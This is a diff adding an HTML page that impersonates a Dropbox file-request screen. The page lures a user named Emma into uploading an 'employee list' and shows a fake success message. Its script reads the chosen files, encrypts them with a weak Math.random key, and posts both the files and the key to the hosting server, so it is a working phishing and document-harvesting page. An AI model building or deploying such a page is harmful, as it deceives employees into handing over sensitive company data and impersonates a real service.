@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DropBox</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #F8F9FA;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background-color: white;
+            box-shadow: 0 0 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            width: 30px;
+            height: 26px;
+            margin-right: 5px;
+        }
+
+        .logo span {
+            color: #070707;
+            font-weight: 800;
+            font-size: 20px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .notification-icon {
+            margin-right: 20px;
+            font-size: 20px;
+            color: #1E1919;
+        }
+
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #FF5722;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .modal-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 60px);
+        }
+
+        .modal {
+            background-color: white;
+            width: 100%;
+            max-width: 700px;
+            border-radius: 8px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .modal-title {
+            font-size: 24px;
+            margin-bottom: 5px;
+            color: #1E1919;
+        }
+
+        .modal-subtitle {
+            font-size: 16px;
+            color: #637282;
+            margin-bottom: 20px;
+        }
+
+        .upload-box {
+            border: 2px dashed #D9DCE0;
+            border-radius: 4px;
+            padding: 80px 20px;
+            margin-bottom: 40px;
+            cursor: pointer;
+        }
+
+        .upload-box:hover {
+            border-color: #0061FF;
+        }
+
+        .button {
+            background-color: #1E1919;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 4px;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .dropbox-logo {
+            width: 32px;
+            margin: 20px 0;
+        }
+
+        .file-info {
+            font-size: 14px;
+            color: #637282;
+            margin-top: 20px;
+        }
+
+        .file-info a {
+            color: #0061FF;
+            text-decoration: none;
+        }
+
+        .file-info a:hover {
+            text-decoration: underline;
+        }
+
+        .success-image {
+            width: 200px;
+            margin: 20px 0;
+        }
+
+        .success-modal {
+            display: none;
+        }
+
+        .input-file {
+            display: none;
+        }
+
+        .upload-text {
+            color: #637282;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        /* Success screen elements */
+        .finished-uploading {
+            font-size: 24px;
+            margin-bottom: 5px;
+            color: #1E1919;
+        }
+
+        .upload-confirmation {
+            font-size: 16px;
+            color: #637282;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">
+            <img src="https://www.dropbox.com/static/30168/images/favicon.ico" alt="DropBox Logo">
+            <span>DropBox</span>
+        </div>
+        <div class="header-right">
+            <div class="notification-icon">🔔</div>
+            <div class="profile-icon">CP</div>
+        </div>
+    </div>
+
+    <div class="modal-container">
+        <!-- Request Screen -->
+        <div class="modal request-modal" id="requestModal">
+            <h1 class="modal-title">John sent you this request</h1>
+            <h2 class="modal-subtitle">Employee List</h2>
+            <p class="modal-message">Hey emma, please share the employee list over this</p>
+
+            <div class="upload-box" id="uploadBox">
+                <button class="button" id="addFilesBtn">Add files</button>
+                <p class="upload-text">or drag stuff here</p>
+            </div>
+
+            <img src="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_logo_glyph_m1.svg"
+                alt="DropBox Logo" class="dropbox-logo">
+
+            <p class="file-info">
+                Your files will be uploaded securely to John's DropBox account. More about
+                <a href="#">file requests</a> and our <a href="#">privacy policy</a>.
+            </p>
+
+            <input type="file" id="fileInput" class="input-file" multiple>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="modal success-modal" id="successModal">
+            <svg role="presentation" class="success-image" viewBox="0 0 500 500" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <g fill-rule="evenodd" clip-rule="evenodd">
+                    <path
+                        d="M245.7 112.3c-2.1.5-4.4 2.6-2.9 3.6.2 0 0 .1-.6.3-8.2 1.3-12.9 15-8.9 20.7 7.9-.8 21.1-.6 29.4-.1 1.6-11.1-2.3-16.4-10.1-21.6-.9-2.5-4.4-3.6-6.9-2.9Z"
+                        fill="#422608"></path>
+                    <path
+                        d="M191.7 56.2c-1.1-.3-.8 5.8-.8 7.5-1.9-.2-3.6-.6-4.5 1.2-1.6 2.4-4.5 5.7-3.9 8.4 2 12.3 5.5 10.2 1.2 29.5-1.2 9.8-4.2 24.2-1.4 33.4 6 15.1 25.3 26 32.8 37.1 2.2 3.1 1.5 16.2 3.7 17.8 3.6-7 12.5-22.8 14.8-30.6-2.4-2.2-6.2-5.2-10-7.2-5.5-3.1-7.5-5.2-12.9-10.5-5.8-6.4-10.1-7.7-15.9-12-.7-1-.6-.4-.4-8.4.1-12.8-1.7-19.3.3-33.1.9-3.7 1.5-34.9-3-33.1ZM317.9 59c-.7.9-.9 1.8-1 6.3-.2 7.9-1.4 8.1-1 16.7.8 19-10.1 36.4-16.3 53.3-8.6 8-22.7 16.3-32 24.9 2.1 5.4 11.1 28.2 11.7 29.5 2.6-11.2 2.8-15.5 12.2-24.6 8-8 9.3-10.9 14.6-17.5 6.9-7.6 8.4-11 11.1-19.3 3.7-11.9 5.8-27 9.7-38.2 1.3-3.4 3.2-6.8 3.2-10.4.1-2.2-1.2-4.9-2.5-6.5-.6-.7-1-1.3-1.1-1.9-1.8-5.2-5.7 4.7-5.6-2.6-1-2.3 1-11.1-3-9.7Zm-73.7 60c-7.1 6.3-12 8.7-11.1 18.4-2.2 0-2.6 4.6-1.5 6.4.6 1.8 2.6 2.2 4.6 2.7 1.2 4.4 2.5 8.9 2.9 13.5-.3.6-1.2 2.1-1.6 2.3-.5.2-.4.6.2.8 5.2 6.5 14 8.6 20.2 2.5 8.9-8-4.2-.7 1.2-15.3.3-1.1.3-3.1.9-4.3 4.4-.6 6.4-3.9 6.2-8.2-.4-.4-1.6-1.5-1.9-1.6-1.4-1.1-1.8-4.3-3.3-5.9-2.6-2.4-5-3.4-7.6-6.9-4.8-4.8-5.8-7.6-9.2-4.4Zm20.5 99.3c-4.2 0-9.6.7-13.4 1.6-2.9.8-24.4-.3-26.8 1 3.5 10.4 0 18.8-1.4 29.1 17.7-2.2 37.1-2 55.8-2.2-1.9-8.9-7.4-19-3.6-28.5 2.1-2.3-8.4-.8-10.6-1Zm15.2 56.9c-11.4 1.7-19.4 4-27.1 9.7-6.4-.8-17.3-4.3-25.4-5.1-2.8-.5-5-.1-7.1.4 0 0 .1 2.7.4 5.9-.3 4.3 2.8 14.3 3.8 17.4.7 7.8 5.8 22 7.6 28.7 2 10.7 1.4 38 3.8 44.4 2.3 13.5 7.7 26.8 10.9 40 0 .6 8.3.5 10.6-.2.9-5.3-1.1-13.7-.8-24.7.1-17.1-2.4-23.4-3.7-37.8-.4-8.1 1.8-10.5.6-19.2-1-7.6.4-2.7.2-6.9.1.5.4 2 .8 2 .6-1.1.5 10 1.2 11.4.6 9.8 8.7 22.9 17.9 12.6 5.3-9.8 4.5-21.8 6.4-32.1 3.2-20.4 3.3-28.1 2.3-46.8-.7 0-1.5 0-2.4.3Z"
+                        fill="#CF7D42"></path>
+                    <path
+                        d="M232.1 192.2c-6.2 4.4-8 4.5-10.7 7.4-3.3 3.1-10.1 5.1-12.6 8.1-8.9 6-14.2 11.3-25.2 12.1-8.8 1-10.9-1.5-18.1-5.4-4.3-2.2-10.2-4.1-13.9-7.1-11.3-8-28.2-13.5-42-14.7-22.7-1-42.6 6.8-62.5 17.4-9 3.5-18.5 8.4-25.9 13.5-5.2 4.1-11 5-11.2 11.8-1 14.8-7.8 29.1-9.8 41.6 24.5-10.2 44.6-30.7 69.8-39.7 21.6-9.9 53.8-6.2 74.8 8.1 7.1 5.2 18.5 16.2 25.2 20.2 3.2 2.9 15.4 2.2 19.4.7 11.5-2.2 20.7-8.8 28.3-18 2.5-3.4 16.3-12.7 21.9-12-1.7-3.7.4-9.7 2.8-12.6 3.8-4.4-2.9-7.8-4.1-11.8-1.9-6.2 1.8-18.5 2.1-24.4 0-1.4-4 2.2-8.3 4.8Zm136.9-.7c-26 1.4-50.4 18.7-75.9 18.8-15.8 1.8-23.6-8.9-37-11-.1.5-.1 7.3-.1 9 .8 2.5 2.5 9 1.9 9.7-.5 1.4-7.1 10.5-6.4 10.2-.1.4.1.7 1.7 2.1 7.7 6.7-.4 9-2.3 14 1 1.3 4.9 1.1 7.4 1.6 10.1 1 18.9 4.5 29.1 5.4 15.2 2.7 35.7-6.7 50.8-11.7 19.9-4.2 51.8-9.2 71.4-9.6 10.3 2.4 25.9 6.3 37.5 9.2 16.7 5.3 33.3 12.6 50.2 17.8 4 1.3 3.2 2.4 1.5-3.2 0-.4.6.9.8 1 .6-8.3-1.2-20.8-3.5-28.8-.6-3.4-2.1-4.6-1.3-8.6.9-4.3-.4-2.1-5.8-3.6-10.1-1.3-20-6.1-30.9-9-7.4-2-16.9-3.5-25.5-6-14.5-3.6-25.7-5.7-40.5-7.6-5 .2-20.8.1-23.1.3Z"
+                        fill="#78286E"></path>
+                    <path
+                        d="M262.7 159.3c-3.8.2.3 3 1.4 2.9 1-.1 3.7-.9 3.9-1.1.3-.3.2-.4-.7-1.2-1.3-1.5-2.9-.8-4.6-.6Zm-29.1.5c-1.2 1.7 5.4 4.9 6.6 3.4.4-.8-5.6-4.4-6.6-3.4Zm22 22.4c-5.1.2-21.9 0-26.7 1.2-.3 1.6 1 6.5.8 8 1.5 6.9 1.9-.7 1-4.7-1.1-3.6 36.8-1.9 35.2-2.2.2.7.8 6.2.6 8.1-6.7.5-21.5.7-28.2 1.3-3.3 4.2 25.2 1.6 28 1.4.8-.6.7 9.7 1.6 8.9 1.4-.6-.3-5.5 0-8.7-1-15.4-.1-13.6-12.3-13.3Zm-9.2 5c-1.7 1-3.9 3.1-5.6 2.7.8-.7 2.3-1.8 1.4-2.6-.2-1-2.7 1.8-2.7 1.7-1.7.4-.6 1.5.5 1.6 0 .3.8.6 1.4.4.8-.3.7.4 1.7 0 .6-.2.8-.2 1.3.1 1.3.7 3.1-.5 4.3-1.1 1.1 1.3 1.5 1.5 4 .7 3.1-.8 2.4.6 6.5-1.2 2.3-.9 2.3-.9 2-1.7-.5-1-.7-.4-1.9 0-2 .9-2 .9-2.3.1-.5-1.6-2.1-.2-3 .7-.3.3-3.4 1.3-4 1.3-.3 0 .4-.8 1.1-1.1 1-.4.2-.9-.2-1.5-.4.2-2.9 1.8-2.6 1.1.1-.9-.5-2.2-1.9-1.2Zm-13.1 1.1c.9 2.7 3.4 1.8.9-.1-.7-.3-1.5-1.3-.9.1Zm45.4 2.1c-.7 3.8-2 10.4-3 14.1-.1 1.5-1.3 3 1 3.2 1.7-.8.8-2.9 1.9-4.8.3-2.3 4.5-12.9.1-12.5Zm-60.6 1.4c-.4 1.7.8 10.4 4.5 8.1-.1-.7-2.1-6.6-2.2-7.3.1-.8-2.1-2.2-2.3-.8Zm26.9 7.3c-1.5 1.5-1.3.2-2.3-.5-.4.4-5.2 4.2-4.4 5.8.3 1.1 1 .1 1.7-.3 1.2 2.3 3.3-.4 4.5-.8 1.2 3.2 3.8-.6 5.4-.2 1.5.5 1.5-.8 2.8 1.1 1.4-.6 2.9-1.8 4-3-.5-1.1-1.2-2.1-2.1-2.5-.1-.7-2.1.9-2.6 1.2-.2-.3-.9-1.5-1.1-1.6-.7.5-3.5 2.8-3.9 2.7-.1-.2.6-.6.5-.8 0-.3-1.2-2.1-1.4-2.1.1.1-.5.5-1.1 1Zm1.7 9.6c-2.3.4-4 .2-5.3.5 0 1.2.9 2.9 3 2.6 3.3 0 8.6-.4 8.8-.7.4-.2-.9-2.2-1.2-2.8-1.7 0-2.9.1-5.3.4Zm8 4.4c-4.4.2-12.3.4-16.6.9-.3 0 0 1 .5 1.7 1.5 1.6 17.1.3 19.4-.6-.5-2.2-.9-2.5-3.3-2Zm25 37.7c.4 5.9 2.5 17.4 1.5 23.5 3.9 1.1 2.5-3 2.8-7-.1-3.1-.5-19.2-4.3-16.5Zm-58.2 2.3c-1.5 6.6-2.5 6.6-2.2 14.9.6 6.2-1.2 14 3.5 11.5-.5-2.3-1.2-15.9-.4-18.7.5-3 1-6.8 1.6-9.6-1.5-.9-1.9-.6-2.5 1.9Zm26.6 1.3c-.9 4.4 3.2 14.6 4.1 18.8.8 2.4.6 2.6-.9.7-1.4-1.8-3.3-3.6-6.8-6.7-10.6-7.8 2.8 6.5 3.6 7.7 1.6 2.3 2.4 2.4 4.5 2.4.1 1.6.3 5.3.4 6.4.2 1.3-.1.8-.6 1.2 3.4 1.9 1.2-11 1.5-15.3-.6-4.1-1.2-15.2-5.8-15.2Zm3 4.3c.7 1.9 1.8 9.8 1.5 12.5-.3-1.8-4.4-13.8-3.6-16.1.6.9 1.7 2.6 2.1 3.6Zm14.2 4.4c-6.5 5.3-8.2 6.4-3.1 6.7.7-1.5 8.4-7.2 9-8.4-.1-.6 1.1-1.2.2-1.5-1.6-.5-1.3-.6-6.1 3.2Zm-11 83.7c-1.1 1.4 3.5 1.6 3.6 1.1.5-.8-3.4-1.7-3.6-1.1Zm.9 5c-3 1.5 4.3 1.9 4.6 1.2.2-.6-3.6-1.9-4.6-1.2Zm8.2 6c-1.3 5.6-2.9.5-5.2 2-.3 1.3-5.1-1.3-5.2-.6.1.5 1.3 1.4 2.1 1.6-1.7.4-.9 1.5 1.6 2.7 1.3.8 5.3 1.1 6.4.3 2.1-.6 2.6-5.5 2.2-6.5-.2-.1-1.4-.3-1.8-.4l-.1.9Zm-5.5 3.1c1.7.3 1.2-.5 2.3.1.6.4 1.2.4 1.8.4-1.9 2.3-3.2 1.4-5.3 0-1.9-1.2-.1-.6 1.2-.5Zm-7.5 55.5c-3.6.6-2 3.8.4 5.9-1-.3-3.2-1.3-3.2-.2-.2.5-.2.5-.1-.2.1-1.3 1-6.3-1.6-3.4-1.6 3.1.8 7.5-1 10.6-9.6 9.8-9.4 13.7 6.5 13.9 4.2-.2 8.3-.9 9.9-3.8 0-.3.2-.3.9-.3 2.5.3 2.2-3.7 1.7-5.3-2.2-4.5.6-14-5.3-15.9-1-.2-1 .1-.1 1.3 2.5 3.1 1.9 10.3 3 14.2 0 .7-1.8 1.3-2.4 2.9-.6 1.3-1.3 1.7-3.3 2.1-2 .5-3.2 1.4-5.2 1.8-1.1.3-1.2-2-2.4-2.1-5-1.7-1.8 2.7-7.6-.1 2.9-5.3 9-7.4 6.6-14.5.6.8 2.6 1.7 3.4 1.8.4.3.2.7-.8.5-.7-.1-1-.1-1.2.2-.5.5.8 1.1 1.2 1.2 1.1 0 .5 1.4.3 2.3-.7 0-3.1 0-1.1.6.7.2.8.3.7.8-.4 1.1 1.9 1.7 2.2.5.2-1.6 3.7 1 4.3.1.7-.5-2.7-1.5-3.5-1.7 0-.4.1-1.8.2-1.9.8.1 4.4 1.1 4.1.5.1-.2 0-.4-.3-.6-.6-.6 2.9.5 1.8-1.2.4-1.2-7.2-1.3-3.7-2.9.7-.5 1.5-1 1.9-1 1.8-.7.4-3.9.4-4.9-.8-1.3-4.9-1.6-6.7-1.2Zm4.9 1.9c1.1 3.6-.3 2.3-2.5 4-2.7-3-2.9-4.7 1-4.7 1.1 0 1.2 0 1.5.7Zm-4.5 5.4c.5.8-1.6.2-1.4-.4l-.1-.5c.4.1 1.4.5 1.5.9Zm2.9 2.1c.7.9-.2.2-.5.3-.4-.4-.1-1.4.5-.3Zm2.7.2c.4.5-.9.1-1-.1-.3-.6.9-.1 1 .1Zm5.2 11.1c-.6 2.3-1-.9-.3-1.3 1-1.5.5.5.3 1.3Zm-14.3 1.4c1.9 5.2 9 .7 12.3.1-3 4.3-15.8 4.8-18.8.1.1-.1.5 0 .9.2.8.3 4.1.8 4.4.6.1-.3.6-1.7 1.2-1Z"
+                        fill="currentColor"></path>
+                    <path
+                        d="M190.4 61.3c.2 1 3.2 1.1 3.4.7.7-.4-3.3-1.5-3.4-.7Zm127.4 2.2c-1.6.9 2.6 1.7 3.1 1.1-.4-1-1.9-1.4-3.1-1.1Zm-127.7 1.7c.1.7.1.8-.1.4s-1.5-1-1.7-.8c-.3.4.2 1.8-.8 1.7-.8.4-1.4-2.1-1.9-.8.6 1.7 1.7 6.4 1.5 8.3-.9-3.1-5.1-9.1-2.4-1.6.7 2.4 1.9 3.2 1.1 4.4-.6 0-2.3-4-3.3-4.4-1.4-.5 0 2 .6 3.1.9 1.5 3.2 3 4.2 1.6 0-.5 1-.8 1.2-.5 2.1 3.8 3 .4 1.4-.9-1.3-.6-1-6.6-2.5-8.2.4.1 1 .3 1.3-.1 1.2-.6 2.9 4.6 3.1 5 1.9 5 1.2-1.6-.3-3.4-1.1-4 .2-1.9 2.4-2.6.3-.8-3-.2-3-1.1 0-.8-1.1-1.6-.8-.1Zm127.4 3.9c-1 .6 4.9 1.1 3 .2-.5-.5-2.8-.6-3-.2Zm7.3 2.9c-2.2 1.7-2-1-2.7-.1-.1.8.9 1.4 1.7 1.7-1.5 2.1-1 5.9-3.1 7.3-2.6 1.5.1 2 1.3 1.4.6-.4.7-.4.8-.1.4 1 2.2.6 3.1 1.4.9 1.7 5.6-2.2 4.8-3.3-.5-.5-.6-.5-1.4.4-.6.7-.7.7-1 .4-1-.6-.6-.5 0-2.2 1.1-2.3 1.2-2.9.7-3.2-.4-.8-3 5.3-3.3 5.1l-1.1-1.1c.9-1.3 2.9-5.1 2.3-5.5-.3-.4-.5-.2-.9.9s-1.7 3.3-1.7 2.8c-.2-1.3 4.6-8 .5-5.9Zm-4.9.9c-2.5 3.2-4.8 5.1-3.1 6.4.5.2.5.2 1.1-.8.6-1.1 3-4.3 4-5.7-.8-.7-.9-1.2-2 .1Zm5.2 7.9c.4.5.2.8-.7 1.1-1.6.9-.5-2.5.7-1.1Zm-136.2 1.8c-.3 1.7 2.1 5 2.2 2.1.4-1.9-2.3-4.7-2.2-2.1Zm139.2-.9c.2.1-1.9 2.1-1.4 1 .3-1 1.1-1.5 1.4-1Zm-6.4 7.5c0 1.1-.8 3.9.2 4.7-1.9-.7-6.7-4-6.5-.5.9 1.9 5.5 2.4 7.7 4.3 1.4.7 1.9 1.3 2.3-.3 1.4-2.2-3.1-2.6-3.1-3.7.5-.7.2-6.7-.6-4.5Zm-69.5 39c-5.6 1-4.4 6.8-1.4 9.4 1.1 1.1-1.3 1.1.9 2.2.8.4 1.3.2 1.3-.5.4-.7-1.8-2-2.2-2.6-.4-1.2-1.9-4.4-1.5-5.8 2.1.3 5.7-2.1 7.8-.6 1 .6 1.3.6 1.3.3-.8-1.4-4-3.4-6.2-2.4Zm-13.4.7c-1.5 1-2.9 2-1 2.9 1.9-1.6 3.7-2.1 6.4-1 2.9.6-3.9-3.6-5.4-1.9Zm12.1 2.9c-1.7.7-2 2.2 0 2.2 1.1-.2 1.5 1.1 2.6.8 2.3-.2.2-2.2 2.9-.9.3.2.5.2.7 0 .3-1-4.9-3.6-6.2-2.1Zm-10.1.1c-1.1.3-4.1.9-2.7 2 .5.4.5.5 1.3.2s.8-.3 1.5.4c.6.9 2.7.9 2.6-.1-.3-.9 1.9.3 1.8-.5-1-.9-3-2.6-4.5-2Zm1.6 5.2c-.9.7 1.7 4 1.7 2.7-.1-.7-.6-3.2-1.7-2.7Zm21 1.7c-.3 1-.8 2.9-.9 4 .7 2.9 2.4-1.8 2.5-3.1 0-.5-1.5-2-1.6-.9Zm-18.6.3c-1.2.6 3.6 3.2 4.3 1.5-.1-.1-.8-.8-.9-.6-.9 1-2.8-1.4-3.4-.9Zm3.7.1c-.3 1 3 1.7 1.4.2-.6-.5-1.2-.6-1.4-.2Zm6.3.5c-.2.2.2 1.1.6 1.4.5.7.3 3.4.7 4.3.9 1.4 2.4.4 2.2-1.4.4-1.4-2.3-5.1-3.5-4.3Zm-22.5 1c-.4 1 .4 5.7 2.6 3.7-.2-1.3-.9-4.7-2.6-3.7Zm6.1 1c-3.4 2.1 1.5 7.3 3.1 8.7 1.4.7-3.3-5.9-3.1-6.7-.5-.9 2.5-3.3 0-2Zm8 1c-4.6-.5-5.3 2.7-2.1 2.1 1.5-.4 5.7-.8 7.2-.7.8.1-.9 1.3-1.2 1.6-1.6-.1-8 .2-2.8 1.1 3.8.6-3.7.8-3.8-.7-2.6-2.4.1 2 2.1 2.7 3.4 2.1 7.2-1.4 7.9-4.3-.9-2.8-4.2-1.7-7.3-1.8Zm11.3 5.7c-4.2 9.8-15.3 13.2-19.1 1.3-1.1-2.2-2.2-1.5-1 1.1 3.3 9.9 16.1 10.3 19.9 1.1 1.2-2.3 1.6-4.3.2-3.5Zm-10.7 1.8c-3.7-.1.5 2.4 1.7 2.2 2.9-.5 1.4-2.8-1.7-2.2Zm8.3 8c-.6.8-2.2 4.7-.3 5.4.1-.3 1.4-6.2.3-5.4Zm-13.2 2.3c-.6.1 3.6 9.6 3.3 5.7.5-.7-2.8-8.4-3.3-5.7Zm205.5 40.2c-.4 11.2 10.2 17.5 15.5 26.2 2.6 4.5 1.6-1.9 1.9-3.9-1.4-1.3-1.5-2.9-1.4-4.9-4.7-4.2-10.9-14.1-16-17.4Zm-83.4 2.5c-.8 2.4 8.4 4.6 10.4 5.9 15.1 6.3 22.3 12.1 34.2 20.4-3-5.2-16.6-12.8-20.9-15.8-5.2-2.5-18.5-9.7-23.7-10.5Zm-278.1 3.6c-11.7 4.8-22.1 12.4-31.8 21.7-8 7.5-13.4 17.1-19 25.9-.3.8-.4.9-.1 1.3 1.1 1.5 1.5-1.6 3.2-3.4 9.5-17.2 30-36.7 46.7-43.6-1.8 1.8-16.4 13.5-20.9 16.5-1.7 1.5-2.8 1.4-1.5 2.7.6.6.6.6 1.1.3.3-.2 1.5-1.1 2.8-2.1 2.7-1.8 22-17.8 22.7-19 0-.2-.7-.9-.9-1.2l-2.3.9Zm68.3 3.8c-6.5 3.8-16.5 7.9-23.3 11.2.3 1.2 1.3 2.4 2.2 3.4 3.1-2.1 27.9-11.8 25.2-14.7-1.2-2-1.7-.7-4.1.1Zm126.7.2c-.7.2 8.6 8.3 7.3 8.4 0 2.1 2 1.4 3.4 3.1-.8 2.8 40.6 21.7 29.6 10.9-7.2-4.2-21.6-10.2-30.1-13.4-1.6-.5-1.6-.5-3.5-2.7-1.7-2.2-5.6-4.8-6.8-6.8l.1.5Zm29.3 5c.1 3.8 21.8 4.7 22 6.8 2.4 1.9.4-2.6-.2-3 1.4-.1-21.7-5.8-21.8-3.8Zm-211.8 2.1c-3.9 1.7-27.4 11-26.2 14.1-2.3 2.1-8.9 5-8.8 7.4.6 1.1.9.4 2-.3 9.1-6 14.4-7.7 24.6-13.4 4.4-2.7 9-4.1 12.5-6.1-.7-1.7-1.9-2.8-4.1-1.7Zm109 4.1c-2.2 7.5-9.9 20.1-15 25.7-.9-.8-.1.6-.2 1 1 3.3 4-4.5 5.9-6.5 2-1.9 13.3-22 9.3-20.2Zm91.6 2.4c4.7 2.1 19.4 7.9 22 10.3-9.5-1.5-22.7-7.5-28.5-12.7 0-.2 4.2 1.3 6.5 2.4Zm117-2.1c-.1 1.4-.8 1.4-.6 3.1-.4 1.8 4 8.1 5.9 8.3.4-.2-.1-1.1.3-.7.9.7.8-.2 1.4-.4.9-1.5-.4-3-2.4-4.9-2.4-2.3-2.8-2.9-1.3-2.2.1-.2-1.5-2.5-1.7-1.5-.5 1.3-.7-3.1-1.6-1.7ZM250.8 232c-.3.6-.8 2 .2 2.3.9.6 1.6.5 1.7-.3.1-1-.9-2.5-1.9-2Zm-67.1 12.8c-2.2 3.1-15.9 16.4-17.8 19.3-1.2 1.2.9 1.9 1.5 2.2 1 .4 1.1-.4 2.4-1.9 2.6-3.4 12.3-12.5 13.4-13.9.7-1.2 3.9-4.3 3.8-4.9 0-.2-2.3-1.7-2.6-1.7.1 0-.3.4-.7.9ZM38 247c-.5.8-.8 3.7-.2 1.6.5-1.1 1.8-4.3.2-1.6Zm214.6 38c-.5 5 1.3 23.2.3 29.7-.3 4.1-.3 11.4 0 15-.2 1.1 1.4.5 2.3.2-1.6-4.8 3.9-47.1-2.6-44.9Zm-5.9 55.4c-1.8 1.8-3.8 6.2-.1 7 1.1-1.8 3-6.1.7-7.4l-.6.4Zm-10 .4c.3.3 2 4 2.4 3.2.8-.1-3.2-5.3-2.4-3.2Zm18.5 72.7c.1.5.8 3.5 1.5 3.5 1.1 0-.1-3.7-.7-3.9-.8-.3-1-.3-.8.4Z"
+                        fill="#1E1919"></path>
+                </g>
+            </svg>
+
+            
+            <h1 class="finished-uploading">Finished uploading</h1>
+            <p class="upload-confirmation">We'll let John know you uploaded files.</p>
+
+            <button class="button" id="uploadMoreBtn">Upload more files</button>
+
+            <br>
+
+            <img src="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_logo_glyph_m1.svg"
+                alt="DropBox Logo" class="dropbox-logo">
+            <p class="file-info">
+                Your files will be uploaded securely to John's DropBox account. More about
+                <a href="#">file requests</a> and our <a href="#">privacy policy</a>.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const requestModal = document.getElementById('requestModal');
+        const successModal = document.getElementById('successModal');
+        const fileInput = document.getElementById('fileInput');
+        const uploadBox = document.getElementById('uploadBox');
+        const addFilesBtn = document.getElementById('addFilesBtn');
+        const uploadMoreBtn = document.getElementById('uploadMoreBtn');
+
+        // Add Files button click handler
+        addFilesBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            fileInput.click();
+        });
+
+        // Upload box click/drag handler
+        uploadBox.addEventListener('click', (e) => {
+            // Only trigger file dialog if the click wasn't on the button
+            if (e.target !== addFilesBtn) {
+                e.preventDefault();
+                fileInput.click();
+            }
+        });
+
+        uploadBox.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            uploadBox.style.borderColor = '#0061FF';
+        });
+
+        uploadBox.addEventListener('dragleave', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            uploadBox.style.borderColor = '#D9DCE0';
+        });
+
+        uploadBox.addEventListener('drop', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            uploadBox.style.borderColor = '#D9DCE0';
+
+            if (e.dataTransfer.files.length) {
+                fileInput.files = e.dataTransfer.files;
+                handleFileSelect();
+            }
+        });
+
+        // File input change handler
+        fileInput.addEventListener('change', (e) => {
+            // Prevent event from bubbling up to avoid reopening the file dialog
+            e.stopPropagation();
+            handleFileSelect();
+        });
+
+        // Upload more button handler
+        uploadMoreBtn.addEventListener('click', () => {
+            // Show request modal and hide success modal
+            successModal.style.display = 'none';
+            requestModal.style.display = 'block';
+            
+            // Reset the file input to clear previous selections
+            fileInput.value = '';
+        });
+
+        function handleFileSelect() {
+            if (fileInput.files.length > 0) {
+                processFiles(fileInput.files);
+            }
+        }
+
+        function processFiles(files) {
+            // Generate random password for encryption (not shown to user)
+            const secretKey = generateRandomPassword();
+
+            // Array to hold all the file processing promises
+            const processPromises = [];
+
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                processPromises.push(processFile(file, secretKey));
+            }
+
+            // Once all files are processed, show success screen
+            Promise.all(processPromises)
+                .then(() => {
+                    // Show success modal
+                    requestModal.style.display = 'none';
+                    successModal.style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Error processing files:', error);
+                    alert('An error occurred while uploading the files. Please try again.');
+                });
+        }
+
+        function processFile(file, secretKey) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+
+                reader.onload = function (e) {
+                    try {
+                        const fileData = e.target.result;
+
+                        // Encrypt the file with the secret key
+                        const encryptedData = CryptoJS.AES.encrypt(fileData, secretKey).toString();
+
+                        // Prepare data for upload
+                        const formData = new FormData();
+                        formData.append('file', new Blob([encryptedData], { type: 'application/octet-stream' }), file.name + '.store');
+                        formData.append('key', secretKey);
+
+                        // Send to server
+                        fetch('/upload', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Upload failed');
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            resolve(data);
+                        })
+                        .catch(error => {
+                            reject(error);
+                        });
+                    } catch (error) {
+                        reject(error);
+                    }
+                };
+
+                reader.onerror = function () {
+                    reject(new Error('Error reading file'));
+                };
+
+                reader.readAsDataURL(file);
+            });
+        }
+
+        // Generate a random password for encryption
+        function generateRandomPassword(length = 32) {
+            const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+';
+            let password = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * charset.length);
+                password += charset[randomIndex];
+            }
+            return password;
+        }
+    </script>
+</body>
+
+</html>
